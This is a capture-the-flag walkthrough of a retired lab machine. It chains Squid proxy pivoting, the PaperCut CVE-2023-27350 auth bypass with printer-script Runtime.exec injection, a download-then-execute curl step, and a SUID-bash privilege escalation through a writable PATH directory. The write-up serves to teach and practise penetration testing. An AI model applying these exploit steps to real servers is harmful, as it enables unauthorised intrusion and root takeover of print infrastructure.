# Bamboo

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2025--10--07-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Medium |
| **Release** | October 7, 2025 |
| **Rating** | 4.5 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

Only SSH and a Squid proxy on 3128 are exposed; everything interesting sits on localhost behind the proxy. Scanning the full port range *through* Squid finds PaperCut NG 22.0 on port 9191, vulnerable to **CVE-2023-27350** — an authentication bypass chained with RCE through PaperCut's printer-scripting feature. Root comes from a writable directory in the `PATH` of a root process: `pc-print-deploy` invokes `server-command` from a directory the `papercut` user can write to, so overwriting it and triggering a print-queue import from the PaperCut UI sets SUID on bash.

---

Time to pwn: 43 minutes.

## Attack Chain

1. **Recon** — nmap finds only SSH (22) and a Squid proxy (3128)
2. **Internal port scan** — scanning through the Squid proxy reveals ports 9174, 9173, 9192, 9191 and 9195 on localhost
3. **Service identification** — port 9191 is PaperCut NG 22.0 (print management)
4. **Exploitation** — CVE-2023-27350: PaperCut auth bypass plus RCE via printer scripting
5. **Initial access** — reverse shell as the `papercut` user, user flag in `/home/papercut/user.txt`
6. **Privesc** — `/home/papercut/server/bin/linux-x64/` is writable and on the `PATH` of the root process `pc-print-deploy`. Overwrite `server-command` with `chmod u+s /bin/bash` and trigger it via the PaperCut UI
7. **Root** — `/bin/bash -p`

## Key Techniques

### Squid proxy pivoting

- The only externally reachable ports are SSH and Squid 3128.
- All interesting services are on localhost, behind Squid.
- Use `HTTP_PROXY=http://TARGET:3128` or proxychains to reach internal services.
- **Critically, you need a comprehensive port scanner.** Common-port lists miss app-specific ports like 9191 — this cost about 20 minutes. A proxy-aware scanner that covers all 65535 ports (for example `squidscan`) is the right tool. Worth adding to any personal port list: 9191 (PaperCut), 8834 (Nessus), 9090 (Prometheus), 9200 (Elasticsearch), 11211 (Memcached), 27017 (MongoDB), 5984 (CouchDB), 6379 (Redis), 4369 (Erlang), 8500 (Consul).

### CVE-2023-27350 (PaperCut NG/MF auth bypass + RCE)

Affects versions < 22.0.9 and < 20.1.7.

- **Auth bypass:** visit `/app?service=page/SetupCompleted`, then POST the form with `$Submit=Login` to obtain a valid `JSESSIONID`.
- **RCE path:** enable `print-and-device.script.enabled=Y`, disable `print.script.sandboxed=N`, then inject a Java command into a printer script body.
- Script body format:

  ```java
  function printJobHook(inputs, actions) {}
  java.lang.Runtime.getRuntime().exec('COMMAND');
  ```

- `Runtime.exec(String)` splits on spaces using a `StringTokenizer`, so it works for simple commands like `curl URL -o /tmp/file`. For anything more complex, download a shell script first and then execute it — a two-step approach is required.

Note that the standard ExploitDB PoC (51452) returns 403 through the proxy, as do manual POST attempts; the Horizon3 PoC works once proxy support is added. A proxy-aware wrapper is just:

```python
proxies = {'http': f'http://{PROXY_HOST}:{PROXY_PORT}'}
session = requests.Session()
session.proxies = proxies
```

### Writable PATH directory privesc

- `pc-print-deploy` runs as root and calls `server-command` from the `PATH`.
- `/home/papercut/server/bin/linux-x64/` is on that `PATH` and is writable by the `papercut` user.
- Overwrite `server-command` with:

  ```bash
  #!/bin/bash
  chmod u+s /bin/bash
  ```

- Trigger it through the PaperCut UI: Enable Printing → Import BYOD-friendly print queues → Next → Start Importing Mobility Print printers. That flow calls `/print-deploy/admin/api/mobilityServers/v2?refresh=false`, which invokes `server-command` as root.

## Gotchas

- **Bash history expansion corrupts shebangs.** `#!/bin/bash` becomes `#\!/bin/bash` when written through SSH or an interactive bash, because `!` is expanded even inside single quotes. The payload silently fails to execute. Always base64-encode scripts when writing them remotely:

  ```bash
  python3 -c "import base64; print(base64.b64encode(b'#!/bin/bash\nPAYLOAD\n').decode())"
  # then on the target:
  echo "BASE64" | base64 -d > /path/script && chmod +x /path/script
  ```

- **Exfiltration through the proxy is unreliable.** `nc` wasn't available or was filtered, `/dev/tcp` isn't available in `sh`, and HTTP POST exfiltration failed because `SimpleHTTPServer` doesn't handle POST. Injecting an SSH public key and connecting directly over SSH was the approach that actually worked — worth doing immediately on any box where SSH is open.

- **The privesc trigger needs the real web UI.** The BYOD import only works through the iframe-embedded React app, so browser automation (through an SSH tunnel to the proxied port) was necessary rather than a plain HTTP request.

## Tools Used

nmap, curl, proxychains, python3 (requests), SSH, browser automation, and a custom proxy-aware CVE-2023-27350 PoC.

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
